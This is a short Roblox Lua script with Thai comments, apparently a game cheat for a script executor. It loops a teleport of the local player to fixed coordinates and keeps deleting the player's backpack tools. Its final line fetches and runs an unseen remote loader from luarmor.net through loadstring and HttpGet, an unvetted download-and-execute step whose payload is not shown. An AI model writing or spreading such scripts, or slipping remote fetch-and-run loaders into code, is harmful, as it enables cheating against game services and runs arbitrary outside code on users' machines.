local Players = game:GetService("Players")
local lp = Players.LocalPlayer

-- ✅ เป้าหมายเทเลพอร์ต
local targetCFrame = CFrame.new(
    -2.87504387, -591.993408, -25.5160141, -0.747889876, 0, 0.663823009, 0, 1, 0, -0.663823009, 0, -0.747889876
)

-- ✅ รอ character
local function waitForCharacter()
    if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then
        lp.CharacterAdded:Wait()
        repeat wait() until lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    end
    return lp.Character:FindFirstChild("HumanoidRootPart")
end

-- ✅ ลูปเทเลพอร์ตใน background
task.spawn(function()
    while true do
        local hrp = waitForCharacter()
        hrp.CFrame = targetCFrame
        wait(1)
    end
end)

-- ✅ ลูปลบเครื่องมือใน background
task.spawn(function()
    while true do
        local hasTools = false
        for _, tool in pairs(lp.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                hasTools = true
                break
            end
        end

        if hasTools then
            for _, tool in pairs(lp.Backpack:GetChildren()) do
                if tool:IsA("Tool") then
                    print("Tool removed: " .. tool.Name)
                    tool:Destroy()
                end
            end
        else
            print("No tools found in Backpack.")
        end

        wait(1)
    end
end)

-- ✅ โหลดสคริปต์จากภายนอก (ระวังความปลอดภัย)
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/666b9548b0e322722491428b44de9541.lua"))()
